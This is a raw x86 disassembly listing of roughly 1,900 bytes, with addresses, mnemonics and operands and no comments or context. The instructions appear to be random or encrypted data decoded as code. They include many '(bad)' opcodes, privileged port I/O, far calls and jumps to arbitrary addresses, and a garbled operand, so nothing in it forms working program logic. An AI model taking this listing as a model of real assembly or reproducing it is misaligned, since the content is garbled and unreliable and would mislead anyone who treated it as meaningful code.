  4117b2:	add    DWORD PTR [ebx],0xc2e315a4
  4117b8:	mov    ch,0xc3
  4117ba:	mov    esi,0x5d17f2e8
  4117bf:	add    eax,0x7f8da537
  4117c4:	stos   BYTE PTR es:[edi],al
  4117c5:	xor    DWORD PTR [edx+eiz*8],0xb49700d2
  4117cc:	inc    ecx
  4117cd:	cwde   
  4117ce:	stos   BYTE PTR es:[edi],al
  4117cf:	fucompp 
  4117d1:	scas   eax,DWORD PTR es:[edi]
  4117d2:	mov    bl,0x62
  4117d4:	fldcw  WORD PTR ds:0x31ba9758
  4117da:	cmp    ch,BYTE PTR [eax]
  4117dc:	call   0x8c7c:0xd0f27fd5
  4117e3:	pop    edx
  4117e4:	outs   dx,BYTE PTR ds:[esi]
  4117e5:	lods   eax,DWORD PTR ds:[esi]
  4117e6:	or     eax,0x4214ab6f
  4117eb:	stos   DWORD PTR es:[edi],eax
  4117ec:	jmp    0x4117c8
  4117ee:	push   ds
  4117ef:	mov    ebp,0xe69e3d77
  4117f4:	mov    WORD PTR [esi],fs
  4117f6:	sub    edx,0x7e
  4117f9:	call   0x698b:0xa25c341
  411800:	int3   
  411801:	out    dx,al
  411802:	push   0xffffffe3
  411804:	stos   BYTE PTR es:[edi],al
  411805:	in     eax,dx
  411806:	pop    ss
  411807:	inc    eax
  411808:	jb     0x4117df
  41180a:	scas   eax,DWORD PTR es:[edi]
  41180b:	cmp    bl,dh
  41180d:	push   es
  41180e:	test   DWORD PTR [ebx-0x1b],ecx
  411811:	adc    esi,DWORD PTR [ebx]
  411813:	loop   0x411798
  411815:	lods   al,BYTE PTR ds:[esi]
  411816:	xor    eax,0x891cec59
  41181b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41181c:	into   
  41181d:	mov    ecx,DWORD PTR [ecx+0x4c239dbb]
  411823:	mov    ecx,0x33b2eb2f
  411828:	lea    esi,[ecx+0x5fe7a878]
  41182e:	or     ch,BYTE PTR cs:[eax]
  411831:	cmp    edi,DWORD PTR [eiz*2-0x8500a9]
  411838:	int    0x56
  41183a:	imul   esi,DWORD PTR [edi-0x45],0x78fb0f9
  411841:	xor    bh,BYTE PTR [edi-0x10]
  411844:	daa    
  411845:	popf   
  411846:	and    ch,ah
  411848:	loope  0x411859
  41184a:	and    bh,BYTE PTR ds:[edi+0x77]
  41184e:	dec    eax
  41184f:	push   ebx
  411850:	push   cs
  411851:	jnp    0x4118a3
  411853:	pushf  
  411854:	push   0xf5a1e9fa
  411859:	cmp    al,0xb
  41185b:	cmc    
  41185c:	test   BYTE PTR [eax],bh
  41185e:	ds mov ebp,0x463756d8
  411864:	ret    
  411865:	jo     0x41186d
  411867:	push   ds
  411868:	call   0x62ee1840
  41186d:	repnz pusha 
  41186f:	or     DWORD PTR [esi-0x4e],ebp
  411872:	push   esi
  411873:	mov    ecx,0xbd14418a
  411878:	(bad)  [eax]
  41187a:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  41187c:	dec    ebp
  41187d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41187e:	jmp    0x61c92e6f
  411883:	pop    eax
  411884:	in     al,dx
  411885:	push   edx
  411886:	or     dl,dh
  411888:	pop    eax
  411889:	popa   
  41188a:	shl    BYTE PTR [edx],1
  41188c:	aam    0xfc
  41188e:	xor    bl,BYTE PTR [esi-0x13f16fb1]
  411894:	mov    bl,0x26
  411896:	sub    al,0x80
  411898:	push   esp
  411899:	fiadd  WORD PTR [ebp-0x38]
  41189c:	push   edi
  41189d:	xor    eax,0x94fe85a0
  4118a2:	mov    bl,BYTE PTR [eax-0x24]
  4118a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4118a6:	sbb    al,0x20
  4118a8:	call   0x82a1:0x1415f866
  4118af:	add    al,0x26
  4118b1:	or     bh,bh
  4118b3:	ror    BYTE PTR [ebx+0x6f],1
  4118b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4118b7:	sbb    eax,DWORD PTR [esi-0x15]
  4118ba:	push   esp
  4118bb:	push   cs
  4118bc:	aaa    
  4118bd:	mov    WORD PTR [ebx-0x42],ds
  4118c0:	jmp    0x83a929a7
  4118c5:	push   cs
  4118c6:	(bad)  
  4118c8:	xor    ah,BYTE PTR [esi]
  4118ca:	ins    DWORD PTR es:[edi],dx
  4118cb:	and    esp,DWORD PTR [esi-0x2b]
  4118ce:	repnz jecxz 0x41187f
  4118d1:	(bad)  
  4118d2:	xor    DWORD PTR [eax+0x1f7840fb],edi
  4118d8:	ins    BYTE PTR es:[edi],dx
  4118d9:	push   edx
  4118da:	jmp    0xdde1:0x71f9360b
  4118e1:	scas   al,BYTE PTR es:[edi]
  4118e2:	gs dec eax
  4118e4:	xor    bl,BYTE PTR [ecx-0xcf73289]
  4118ea:	fbstp  TBYTE PTR [ebp-0x34]
  4118ed:	push   ds
  4118ee:	leave  
  4118ef:	mov    ah,0x21
  4118f1:	mov    esi,0x3c720d57
  4118f6:	and    dl,BYTE PTR [edi]
  4118f8:	adc    eax,0x87377b89
  4118fd:	mov    dh,0x66
  4118ff:	jg     0x41192d
  411901:	or     eax,0x8ea43dab
  411906:	fsubrp st(5),st
  411908:	mov    edi,0x704b5645
  41190d:	aas    
  41190e:	push   edx
  41190f:	fst    QWORD PTR [ebp-0x27]
  411912:	cmp    al,0xcc
  411914:	lock mov ah,0x69
  411917:	nop
  411918:	push   edi
  411919:	out    0xcd,al
  41191b:	outs   dx,DWORD PTR ds:[esi]
  41191c:	xchg   ebx,eax
  41191d:	mov    edx,0x4019752d
  411922:	push   esp
  411923:	repz mov al,0xc4
  411926:	adc    dl,BYTE PTR cs:[ebp+0x69]
  41192a:	ins    BYTE PTR es:[edi],dx
  41192b:	xor    al,0x37
  41192d:	not    DWORD PTR [ebp+0x3f]
  411930:	and    al,0x81
  411932:	test   eax,0xd758fd52
  411937:	add    BYTE PTR [edi],al
  411939:	sub    BYTE PTR [esi+0xb],al
  41193c:	pop    eax
  41193d:	clc    
  41193e:	cmp    al,0x48
  411940:	sbb    eax,0xaea71791
  411945:	sub    ebp,edi
  411947:	rcr    BYTE PTR [esi-0x7c],0x63
  41194b:	add    DWORD PTR [ebx-0x5d],edi
  41194e:	icebp  
  41194f:	push   ebp
  411950:	mov    ebp,0x9502bd59
  411955:	setge  BYTE PTR [esi-0x33ba6a38]
  41195c:	out    dx,eax
  41195d:	adc    al,bl
  41195f:	push   cs
  411960:	adc    edi,esi
  411962:	push   ds
  411963:	inc    ebx
  411964:	in     al,0x3b
  411966:	inc    ebx
  411967:	and    al,0xec
  411969:	sub    BYTE PTR ds:0x7972153b,0x95
  411970:	inc    esp
  411971:	enter  0xb8ba,0xa2
  411975:	sar    BYTE PTR cs:[esi],cl
  411978:	push   edi
  411979:	(bad)  
  41197a:	sbb    BYTE PTR [ebp+0x3c],dl
  41197d:	aam    0x5
  41197f:	and    ecx,DWORD PTR [esi]
  411981:	add    al,0x5d
  411983:	pcmpeqb mm2,QWORD PTR [eax+ecx*1]
  411987:	cdq    
  411988:	(bad)  
  411989:	(bad)  
  41198a:	rcl    BYTE PTR [ecx],0x15
  41198d:	mov    dh,0x58
  41198f:	ins    DWORD PTR es:[edi],dx
  411990:	jnp    0x4119e7
  411992:	sub    al,bh
  411994:	add    DWORD PTR [edx],0xa3bdfe8b
  41199a:	aas    
  41199b:	sbb    BYTE PTR [edx+edi*2],ah
  41199e:	fs xor al,0x21
  4119a1:	inc    ebx
  4119a2:	jns    0x4119a1
  4119a4:	mov    bl,0x1c
  4119a6:	xor    BYTE PTR [eax],cl
  4119a8:	dec    eax
  4119a9:	in     al,dx
  4119aa:	lahf   
  4119ab:	and    DWORD PTR [esi],eax
  4119ad:	or     BYTE PTR [eax-0x1],0xa4
  4119b1:	pop    esp
  4119b2:	push   ecx
  4119b3:	daa    
  4119b4:	fwait
  4119b5:	dec    esp
  4119b6:	lea    eax,[ecx]
  4119b8:	add    eax,ecx
  4119ba:	xchg   edi,eax
  4119bb:	sub    BYTE PTR [ebp+0x79266816],0x5a
  4119c2:	out    dx,al
  4119c3:	jmp    0xcb21db1e
  4119c8:	test   al,0x19
  4119ca:	outs   dx,DWORD PTR ds:[esi]
  4119cb:	sub    eax,0xa8d7926b
  4119d0:	repnz iret 
  4119d2:	rol    BYTE PTR [edi+edi*1-0x38],0x49
  4119d7:	inc    eax
  4119d8:	int    0x1b
  4119da:	out    dx,eax
  4119db:	test   eax,0xe3b89b3f
  4119e0:	scas   eax,DWORD PTR es:[edi]
  4119e1:	push   ds
  4119e2:	xor    BYTE PTR [esi-0x6a],ah
  4119e5:	sbb    BYTE PTR [ebp+eiz*1+0x3f6c5ee6],cl
  4119ec:	imul   ebx,DWORD PTR [ebx+eax*1-0x80],0xf
  4119f1:	adc    al,0x98
  4119f3:	push   ss
  4119f4:	scas   eax,DWORD PTR es:[edi]
  4119f5:	cs fwait
  4119f7:	ins    DWORD PTR es:[edi],dx
  4119f8:	leave  
  4119f9:	fmul   st(6),st
  4119fb:	cwde   
  4119fc:	mov    ebx,0x2ea43b34
  411a01:	dec    esp
  411a02:	cld    
  411a03:	pop    ebp
  411a04:	ss aaa 
  411a06:	mov    bl,0x1f
  411a08:	and    eax,0x9abbd0a1
  411a0d:	(bad)  [edi]
  411a0f:	(bad)  
  411a10:	test   eax,0xf708c0e5
  411a15:	pusha  
  411a16:	aas    
  411a17:	xchg   edi,eax
  411a18:	adc    eax,0x2a308c51
  411a1d:	or     ebp,eax
  411a1f:	retf   
  411a20:	daa    
  411a21:	stc    
  411a22:	scas   al,BYTE PTR es:[edi]
  411a23:	sub    BYTE PTR [eax],al
  411a25:	fwait
  411a26:	clc    
  411a27:	js     0x411a21
  411a29:	stos   DWORD PTR es:[edi],eax
  411a2a:	mov    dh,0x17
  411a2c:	jns    0x4119d0
  411a2e:	cli    
  411a2f:	cld    
  411a30:	xchg   ecx,edx
  411a32:	shr    BYTE PTR [ecx-0x50],0x25
  411a36:	nop
  411a37:	dec    DWORD PTR [ecx+0x21ef787]
  411a3d:	jge    0x411a68
  411a3f:	dec    ebx
  411a40:	test   al,0x1d
  411a42:	fcmovnb st,st(6)
  411a44:	dec    eax
  411a45:	fucomip st,st(7)
  411a47:	xor    eax,0xcb105fbe
  411a4c:	(bad)  
  411a4d:	jns    0x411a85
  411a4f:	dec    esp
  411a50:	ds xchg edx,eax
  411a52:	push   esp
  411a53:	repnz imul ebp,ebp,0xfffffffe
  411a57:	or     eax,0x750d4696
  411a5c:	cmp    dl,0x49
  411a5f:	cmp    DWORD PTR [ebx-0x19eb6e05],eax
  411a65:	sbb    edx,DWORD PTR [esi+0x4adf29d4]
  411a6b:	push   edi
  411a6c:	sbb    al,0xc
  411a6e:	outs   dx,DWORD PTR ds:[esi]
  411a6f:	lock enter 0xb871,0xb
  411a74:	mov    dh,0x97
  411a76:	sbb    bl,al
  411a78:	in     eax,dx
  411a79:	(bad)  
  411a7a:	pop    esi
  411a7b:	cdq    
  411a7c:	sbb    DWORD PTR [edi+0x29b36e5d],eax
  411a82:	ret    0xc06c
  411a85:	and    al,0xc2
  411a87:	mov    ah,0x8c
  411a89:	or     BYTE PTR [edi-0x1a],al
  411a8c:	das    
  411a8d:	xor    esi,DWORD PTR [esi-0x192fac46]
  411a93:	fcom   DWORD PTR [eax-0xc2be119]
  411a99:	ss leave 
  411a9b:	xchg   BYTE PTR [ecx-0x5f],al
  411a9e:	ret    0xc547
  411aa1:	and    al,0xcb
  411aa4:	jo     0x411aad
  411aa6:	fnstenv [ebx-0x5]
  411aa9:	loop   0x411a57
  411aab:	add    BYTE PTR [esi-0xcb77eb5],bl
  411ab1:	mov    eax,0x33720d4a
  411ab6:	add    edx,DWORD PTR [eax+0x62]
  411ab9:	jae    0x411a64
  411abb:	inc    BYTE PTR [ebp+0x5f]
  411abe:	mov    ds:0x329efe6d,al
  411ac3:	mov    al,ss:0x936e04e
  411ac9:	es jecxz 0x411ad4
  411acc:	stc    
  411acd:	pop    ss
  411ace:	fdivr  DWORD PTR [edx+ecx*8]
  411ad1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411ad2:	mov    ch,0x75
  411ad4:	ror    BYTE PTR [esi+edi*2+0x2d],0xff
  411ad9:	and    dh,BYTE PTR [edi+ebp*2+0x30]
  411add:	or     DWORD PTR [ebx-0x498c5ef6],0x414e1e6
  411ae7:	sub    al,0x63
  411ae9:	nop
  411aea:	mov    ebp,0x852c03b6
  411aef:	cmp    BYTE PTR [edi],ch
  411af1:	dec    edx
  411af2:	(bad)  
  411af3:	jnp    0x411b59
  411af5:	push   ss
  411af6:	add    eax,DWORD PTR [edi]
  411af8:	xchg   esp,eax
  411af9:	jbe    0x411b45
  411afb:	cmp    esp,DWORD PTR [ebp-0x33bbe491]
  411b01:	inc    eax
  411b02:	(bad)  
  411b04:	xor    DWORD PTR [edx-0x2e],0x9
  411b08:	inc    edi
  411b09:	repz xchg ecx,eax
  411b0b:	setp   BYTE PTR [eax-0x504c15b0]
  411b12:	je     0x411ad5
  411b14:	into   
  411b15:	mov    dl,0x72
  411b17:	ror    BYTE PTR [edi],0xdc
  411b1a:	test   ebp,eax
  411b1c:	lock faddp st(3),st
  411b1f:	rol    DWORD PTR [edi+0x36b7e75c],0xbd
  411b26:	mul    BYTE PTR [ecx+0x44]
  411b29:	stos   BYTE PTR es:[edi],al
  411b2a:	xchg   esp,eax
  411b2b:	inc    DWORD PTR [ebx-0x298085d6]
  411b31:	bound  ebx,QWORD PTR ds:0x7c62a749
  411b37:	cmp    al,0x38
  411b39:	jnp    0x411b00
  411b3b:	(bad)  
  411b3c:	cmp    eax,DWORD PTR [ecx]
  411b3e:	push   edx
  411b3f:	inc    edx
  411b40:	mov    bl,0x54
  411b42:	nop
  411b43:	push   ds
  411b44:	xchg   ecx,eax
  411b45:	clc    
  411b46:	cwde   
  411b47:	lock push 0xffffff90
  411b4a:	and    dh,bl
  411b4c:	add    dh,bh
  411b4e:	mov    ah,0xb3
  411b50:	sub    eax,0x49701014
  411b55:	pop    eax
  411b56:	sub    ebp,DWORD PTR [ecx+0x91f48fd]
  411b5c:	mov    edi,0xa310a3ad
  411b61:	mov    dl,0xe3
  411b63:	lds    ebx,FWORD PTR [eax-0x52]
  411b66:	xchg   esp,ebx
  411b68:	jb     0x411b9b
  411b6a:	es es iret 
  411b6d:	jecxz  0x411baf
  411b6f:	xchg   ebx,eax
  411b70:	pusha  
  411b71:	iret   
  411b72:	jl     0x411b73
  411b74:	lods   eax,DWORD PTR ds:[esi]
  411b75:	pop    edi
  411b76:	das    
  411b77:	mov    ch,0xb8
  411b79:	add    dl,BYTE PTR [ebx]
  411b7b:	inc    DWORD PTR [eax]
  411b7d:	sub    al,0x73
  411b7f:	mov    esi,ebp
  411b81:	inc    ecx
  411b82:	push   ss
  411b83:	(bad)  
  411b84:	repnz retf 0x8413
  411b88:	push   es
  411b89:	lods   al,BYTE PTR ds:[esi]
  411b8a:	mov    al,ds:0xbc1272b7
  411b8f:	inc    ebp
  411b90:	adc    bh,bl
  411b92:	push   esi
  411b93:	ficom  DWORD PTR [eax+0x7726353d]
  411b99:	jmp    0xba445733
  411b9e:	test   eax,0x38340dd0
  411ba3:	jnp    0x411b88
  411ba5:	out    0x3c,eax
  411ba7:	adc    cl,cl
  411ba9:	fcom   QWORD PTR [ecx-0x46]
  411bac:	xor    DWORD PTR [ecx+0x3335e0b5],edx
  411bb2:	outs   dx,DWORD PTR ds:[esi]
  411bb3:	rol    dh,0xa
  411bb6:	jns    0x411b47
  411bb8:	mov    ds:0x98af20da,al
  411bbd:	mov    ecx,0x5de2f4f
  411bc2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411bc3:	sbb    eax,0x5e622b67
  411bc8:	sbb    DWORD PTR [ecx-0x5],0x1b
  411bcc:	sbb    BYTE PTR [edx+edi*4-0x5f34bf79],0xc2
  411bd4:	mov    esp,0x66eafa12
  411bd9:	push   es
  411bda:	dec    esp
  411bdb:	mov    eax,0xfaad71d0
  411be0:	push   esi
  411be1:	sub    esi,DWORD PTR [ebx+ebp*1]
  411be4:	(bad)
  411be7:	xlat   BYTE PTR ds:[ebx]
  411be8:	es xchg edi,eax
  411bea:	(bad)  
  411beb:	call   0x61e:0xfa48ea1e
  411bf2:	push   esp
  411bf3:	imul   ebx,DWORD PTR [ecx],0x2e8c95db
  411bf9:	rcl    DWORD PTR [ecx],0xa3
  411bfc:	or     DWORD PTR [eax],ebp
  411bfe:	inc    esi
  411bff:	aas    
  411c00:	and    dh,cl
  411c02:	push   esi
  411c03:	ret    0x78da
  411c06:	lods   al,BYTE PTR ds:[esi]
  411c07:	add    al,0xe3
  411c09:	jmp    0x411c64
  411c0b:	je     0x411c47
  411c0d:	inc    eax
  411c0e:	jecxz  0x411c32
  411c10:	(bad)  
  411c11:	cwde   
  411c12:	push   edx
  411c13:	fnstcw WORD PTR [esi-0x6b]
  411c16:	aaa    
  411c17:	loopne 0x411c84
  411c19:	mov    eax,0x8eccb6c
  411c1e:	jmp    0x7d6786f9
  411c23:	aad    0xd0
  411c25:	ret    
  411c26:	aad    0x66
  411c28:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411c29:	aaa    
  411c2a:	cli    
  411c2b:	add    esp,DWORD PTR [ebx-0x12]
  411c2e:	bound  edx,QWORD PTR [edi]
  411c30:	dec    ecx
  411c31:	outs   dx,BYTE PTR ds:[esi]
  411c32:	sub    al,0x98
  411c34:	scas   al,BYTE PTR es:[edi]
  411c35:	dec    ecx
  411c36:	ficomp DWORD PTR [eax+ecx*2+0xd]
  411c3a:	jmp    FWORD PTR [esi+0x37]
  411c3d:	dec    esi
  411c3e:	xor    al,0x0
  411c40:	test   eax,0xdcac553c
  411c45:	adc    DWORD PTR [eax],edi
  411c47:	pop    ds
  411c48:	pop    edx
  411c49:	xchg   esp,eax
  411c4a:	dec    esi
  411c4c:	adc    eax,0x4208e216
  411c51:	sbb    edx,ebx
  411c53:	xor    esi,edx
  411c55:	js     0x411c44
  411c57:	sub    ebp,DWORD PTR [edi+0x4f]
  411c5a:	(bad)  
  411c5b:	dec    edi
  411c5c:	adc    DWORD PTR [edx+0x6358a3ed],edi
  411c62:	jae    0x411c79
  411c64:	imul   ecx,DWORD PTR [ebp-0x7c],0x43
  411c68:	xor    al,0xd6
  411c6a:	ret    0x5136
  411c6d:	fdiv   DWORD PTR [ebx+0x30418be8]
  411c73:	xchg   ebp,eax
  411c74:	pop    esi
  411c75:	les    esp,FWORD PTR [edx]
  411c77:	sub    DWORD PTR [edx],esi
  411c79:	cmp    edx,DWORD PTR ss:[eax+0x7394f20b]
  411c80:	fisubr DWORD PTR [edi+0x6b4ca0ee]
  411c86:	aam    0x41
  411c88:	ja     0x411c7c
  411c8a:	pop    esp
  411c8b:	mov    dh,0x1
  411c8d:	aad    0xfc
  411c8f:	shr    BYTE PTR [ecx-0x3e504b5e],cl
  411c95:	mov    ch,0x9f
  411c97:	fcmovnbe st,st(6)
  411c99:	sub    eax,0x131b2bc3
  411c9e:	push   ecx
  411c9f:	les    eax,FWORD PTR [edi+ebp*8+0x4f71ea98]
  411ca6:	cs inc eax
  411ca8:	ret    0x84e1
  411cab:	mov    cl,0x3f
  411cad:	lds    ebp,FWORD PTR [ebx]
  411caf:	adc    eax,0x5eb64d5b
  411cb4:	inc    esp
  411cb5:	inc    esp
  411cb6:	(bad)  [ecx+0x51504bd3]
  411cbc:	cmp    ebx,edx
  411cbe:	push   ss
  411cbf:	aaa    
  411cc0:	imul   esp,DWORD PTR [eax-0x388e624e],0x10
  411cc7:	add    esp,DWORD PTR [eax-0xc]
  411cca:	sbb    BYTE PTR [esi],0x25
  411ccd:	push   ebp
  411cce:	mov    dh,0x66
  411cd0:	ror    BYTE PTR ds:0xd36449de,1
  411cd6:	sbb    eax,0xb5953631
  411cdb:	dec    edi
  411cdc:	das    
  411cdd:	dec    BYTE PTR [edx-0x7f]
  411ce0:	daa    
  411ce1:	and    al,0x32
  411ce3:	fnstcw WORD PTR [eax+0x572bab44]
  411ce9:	js     0x411c9e
  411ceb:	pop    ebp
  411cec:	popa   
  411ced:	aad    0x87
  411cef:	xor    al,0xa9
  411cf1:	dec    eax
  411cf2:	jge    0x411cbf
  411cf4:	mov    ebx,0x6532eabb
  411cf9:	aad    0x62
  411cfb:	dec    edx
  411cfc:	mov    ebx,0x545b6134
  411d01:	scas   al,BYTE PTR es:[edi]
  411d02:	jo     0x411d7d
  411d04:	jno    0x411d14
  411d06:	mov    ecx,0xb63ebbc9
  411d0b:	in     al,dx
  411d0c:	lds    ebp,FWORD PTR [eax*4+0x3fe42da1]
  411d13:	retf   
  411d14:	jle    0x411cd4
  411d16:	repz jnp 0x411cbe
  411d19:	pop    ds
  411d1a:	sti    
  411d1b:	inc    edi
  411d1c:	jle    0x411d3d
  411d1e:	lods   eax,DWORD PTR ds:[esi]
  411d1f:	mov    esp,DWORD PTR [edi-0x1151dd0a]
  411d25:	sbb    BYTE PTR [edi-0x2c],ah
  411d28:	push   ebx
  411d29:	pusha  
  411d2a:	pop    edi
  411d2b:	inc    ecx
  411d2c:	jo     0x411cd4
  411d2e:	cwde   
  411d2f:	add    ch,bl
  411d31:	cmc    
  411d32:	lods   al,BYTE PTR ds:[esi]
  411d33:	adc    esp,DWORD PTR es:[ebp-0x50794497]
  411d3a:	push   ss
  411d3b:	mov    ds:0x81dffadd,eax
  411d40:	xor    dh,cl
  411d42:	jmp    0x411d6f
  411d44:	pusha  
  411d45:	dec    edx
  411d46:	nop
  411d47:	jl     0x411d96
  411d49:	sahf   
  411d4a:	cmp    eax,eax
  411d4c:	jle    0x411d9c
  411d4e:	rol    ah,1
  411d50:	test   BYTE PTR [ecx+0x68],ah
  411d53:	add    al,0x44
  411d55:	addr16 xor ch,bh
  411d58:	int3   
  411d59:	test   eax,0xbef0b0bd
  411d5e:	cmp    ecx,DWORD PTR [ebx]
  411d60:	dec    esi
  411d61:	cwde   
  411d62:	ret    
  411d63:	inc    ebx
  411d64:	test   DWORD PTR [ecx+edi*4],0xd679ce2c
  411d6b:	stos   DWORD PTR es:[edi],eax
  411d6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411d6d:	pop    edx
  411d6e:	sub    ch,BYTE PTR [edx]
  411d70:	add    eax,0xd47c882e
  411d75:	sbb    eax,0x9713230e
  411d7a:	mov    DWORD PTR [esi+0x1f952f9a],0x382a9696
  411d84:	push   ds
  411d85:	lea    esp,[ebp-0x28]
  411d88:	div    BYTE PTR [ebp-0x31]
  411d8b:	mov    ds:0xe40a88e7,al
  411d90:	stos   DWORD PTR es:[edi],eax
  411d91:	cmp    eax,0xa85d724d
  411d96:	mov    eax,0x8b1d2671
  411d9b:	leave  
  411d9c:	push   ecx
  411d9d:	loope  0x411d9a
  411d9f:	pop    eax
  411da0:	rcr    BYTE PTR [ebx+eiz*8+0x32],1
  411da4:	sbb    al,0x5b
  411da6:	mov    esi,0x118e7a2d
  411dab:	aas    
  411dac:	cmc    
  411dad:	jmp    0x9fc2980d
  411db2:	push   es
  411db3:	fist   WORD PTR [esi]
  411db5:	mov    al,ds:0x499c0761
  411dba:	add    BYTE PTR [edi],ch
  411dbc:	test   DWORD PTR [ebx-0x4acb829f],ebp
  411dc2:	jl     0x411dbf
  411dc4:	xor    BYTE PTR [esi],dl
  411dc6:	adc    BYTE PTR [ecx],ah
  411dc8:	pmulhuw mm1,QWORD PTR [edx]
  411dcb:	sbb    edx,ebp
  411dcd:	push   ebp
  411dce:	inc    ecx
  411dcf:	fsub   DWORD PTR [ebx+0x13]
  411dd2:	and    al,0x1d
  411dd4:	cli    
  411dd5:	or     DWORD PTR [esp+ebp*4],0xc803f24f
  411ddc:	cs popw ss
  411ddf:	popf   
  411de0:	dec    ebx
  411de1:	xor    al,0xae
  411de3:	lods   eax,DWORD PTR ds:[esi]
  411de4:	mov    ds:0xe05046dd,al
  411de9:	jge    0x411e1d
  411deb:	mov    edx,0xbe1dc077
  411df0:	cwde   
  411df1:	mov    DWORD PTR [esi+0x4c],ecx
  411df4:	inc    esp
  411df5:	retf   0x336a
  411df8:	add    ah,BYTE PTR [esi]
  411dfa:	outs   dx,BYTE PTR ds:[esi]
  411dfb:	dec    ecx
  411dfc:	jle    0x411dae
  411dfe:	cli    
  411dff:	enter  0xf29c,0x2d
  411e03:	ja     0x411e00
  411e05:	xlat   BYTE PTR ds:[ebx]
  411e06:	cmp    edi,ebp
  411e08:	rol    DWORD PTR [eax+0x67],0xde
  411e0c:	inc    ecx
  411e0d:	and    ah,BYTE PTR [eax]
  411e0f:	push   eax
  411e10:	loop   0x411de6
  411e12:	std    
  411e13:	push   0x155c68fb
  411e18:	pop    ss
  411e19:	cmc    
  411e1a:	clc    
  411e1b:	or     al,0x73
  411e1d:	mov    edi,0xe9aa14e1
  411e22:	jmp    0x47168cdf
  411e27:	sbb    al,0x77
  411e29:	pop    es
  411e2a:	aam    0x80
  411e2c:	cdq    
  411e2d:	idiv   DWORD PTR [ebp-0x1088c27c]
  411e33:	faddp  st(6),st
  411e35:	mov    esp,DWORD PTR [ebx]
  411e37:	cmp    DWORD PTR [ebx-0x12dad793],0xffffff8a
  411e3e:	jnp    0x411e1a
  411e40:	scas   eax,DWORD PTR es:[edi]
  411e41:	mov    ah,0x42
  411e43:	call   0x2768:0x16581da
  411e4a:	out    0x3e,eax
  411e4c:	jge    0x411dd5
  411e4e:	cmp    eax,0x1779f29d
  411e53:	adc    eax,DWORD PTR [ecx]
  411e55:	popf   
  411e56:	ins    BYTE PTR es:[edi],dx
  411e57:	retf   
  411e58:	mov    ecx,fs
  411e5a:	outs   dx,BYTE PTR ds:[esi]
  411e5b:	and    ah,dl
  411e5d:	dec    esp
  411e5e:	push   es
  411e5f:	jne    0x411e58
  411e61:	pop    edi
  411e62:	xor    al,0xc9
  411e64:	or     DWORD PTR gs:[ebp+esi*2-0x45],ecx
  411e69:	in     al,dx
  411e6a:	test   ch,bl
  411e6c:	or     BYTE PTR [edi+edx*1-0x77bb529],cl
  411e73:	adc    bl,BYTE PTR [eax+eax*4]
  411e76:	dec    ecx
  411e77:	sbb    dh,cl
  411e79:	push   esi
  411e7a:	sub    eax,0xc1c0f273
  411e7f:	adc    bh,BYTE PTR ds:0x2002982b
  411e85:	and    al,0x59
  411e87:	je     0x411ee4
  411e89:	ja     0x411f01
  411e8b:	sub    al,BYTE PTR [esi+0x289e80a]
  411e91:	sbb    ah,dh
  411e93:	aam    0x58
  411e95:	adc    ecx,esi
  411e97:	sbb    eax,0x1e946f68
  411e9c:	jbe    0x411e8f
  411e9e:	(bad)  
  411e9f:	jbe    0x411e3a
  411ea1:	stc    
  411ea2:	mov    edi,0x697d83c2
  411ea7:	and    BYTE PTR [ebp+0x14fe6949],0x94
  411eae:	pop    ss
  411eaf:	or     al,0xbf
  411eb1:	sbb    DWORD PTR [bx+di],esi
  411eb4:	sbb    BYTE PTR [eax],dl
  411eb6:	sub    ebx,esi
  411eb8:	adc    dl,BYTE PTR ds:0x430595bc
  411ebe:	ret    0xb49d
  411ec1:	lods   eax,DWORD PTR ds:[esi]
  411ec2:	cmp    esp,DWORD PTR fs:[edi-0x74bbd31f]
  411ec9:	mov    esp,0xf9e87c8f
  411ece:	add    eax,0xaccacfb9
  411ed3:	add    al,BYTE PTR [ebx]
  411ed5:	es data16 add al,dh
  411ed9:	adc    al,0x1e
  411edb:	jne    0x411f4e
  411edd:	adc    ebp,DWORD PTR [ebx+0x37]
  411ee0:	sub    esi,DWORD PTR [ebx]
  411ee2:	retf   0xb62
  411ee5:	push   edi
  411ee6:	loop   0x411eb6
  411ee8:	popf   
  411ee9:	icebp  
  411eea:	cmp    BYTE PTR [esi+0x5b],dh
  411eed:	pop    edx
  411eee:	xchg   ebp,eax
  411eef:	push   ebp
  411ef0:	add    ecx,DWORD PTR [edx+0x53]
  411ef3:	(bad)  
  411ef4:	dec    ebx
  411ef5:	cs mov dl,0x23
  411ef8:	das    
  411ef9:	pop    ss
  411efa:	sub    esp,eax
  411efc:	cmp    eax,0x62af6e
  411f01:	xchg   esp,eax
  411f02:	cli    
  411f03:	mov    ?,WORD PTR [eax]
  411f05:	mov    dh,0xf
  411f07:	pop    edx
  411f08:	icebp  
  411f09:	inc    edi
  411f0a:	mov    eax,ds:0xcab9790f
  411f0f:	sbb    DWORD PTR [ebx],0xffffffae
  411f12:	imul   ebp,DWORD PTR [esi],0x57f54d03
  411f18:	cld    
  411f19:	push   DWORD PTR [ecx-0x1b]
  411f1c:	jno    0x411ef7
  411f1e:	outs   dx,BYTE PTR ds:[esi]
  411f1f:	cs popf 
  411f21:	or     DWORD PTR [edi+edx*8+0x3da53b10],edi
  411f28:	pop    eax
  411f29:	add    bl,BYTE PTR [ebp-0x3]
  411f2c:	and    BYTE PTR [ecx+0x41ef54da],al
  411f32:	fst    QWORD PTR [ecx-0x4e]
  411f35:	arpl   WORD PTR [ebp+0x13],ax
  411f38:	fsubr  DWORD PTR [esi-0x73e9448f]
  411f3e:	dec    esi
  411f3f:	fistp  QWORD PTR [ebx-0x4a]
  411f42:	jmp    0x7e24:0x9c640373
  411f49:	fs das 
  411f4b:	clc    
  411f4c:	les    ebx,FWORD PTR [ebx+0x14]
  411f4f:	ret    
  411f50:	shl    DWORD PTR [edi],cl
  411f52:	push   ebp
  411f53:	int    0x2a
  411f55:	pop    edx
  411f56:	sbb    eax,0x8434f97a
  411f5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411f5c:	jbe    0x411ef9
  411f5e:	(bad)  
  411f5f:	mov    al,0xa7
  411f61:	xchg   edx,eax
  411f62:	pusha  
